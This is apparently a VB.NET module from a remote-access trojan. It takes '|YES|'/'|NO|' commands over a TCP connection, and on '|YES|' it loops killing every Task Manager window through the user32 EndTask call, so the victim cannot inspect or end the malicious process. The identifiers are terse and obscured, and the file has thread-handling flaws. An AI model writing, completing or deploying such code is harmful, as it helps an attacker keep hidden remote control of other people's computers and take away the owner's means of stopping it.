Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Windows.Forms

Public Class MainCL
    Public Shared LL As Boolean = False
    Public Shared HH As New Threading.Thread(Sub() LaunchWTD())

    Public Shared Async Sub ST(ByVal k As TcpClient, ByVal l As String)
        Dim h As String() = Split(l, "|SP2|")

        If h(1) = "|YES|" Then

            LL = True
            HH.Start()

        ElseIf h(1) = "|NO|" Then

            LL = False




            '   System.Threading.Monitor.Exit(HH)
            HH.Start()
            '   HH.Abort()
            ' Await Task.Run(Sub() LaunchWTD(False))

        End If
    End Sub



    Public Shared Sub LaunchWTD()

        While LL = True


            For Each h As Process In Process.GetProcessesByName("TaskMgr")

                EndTask(h.MainWindowHandle, True, True)

            Next
            ' Application.Run()
            If LL = False Then
                Application.Exit()
                Application.ExitThread()
            End If
        End While

    End Sub
    <DllImport("user32.dll")>
    Public Shared Function EndTask(ByVal handle As IntPtr, ByVal n As Boolean, ByVal j As Boolean) As Boolean

    End Function

End Class
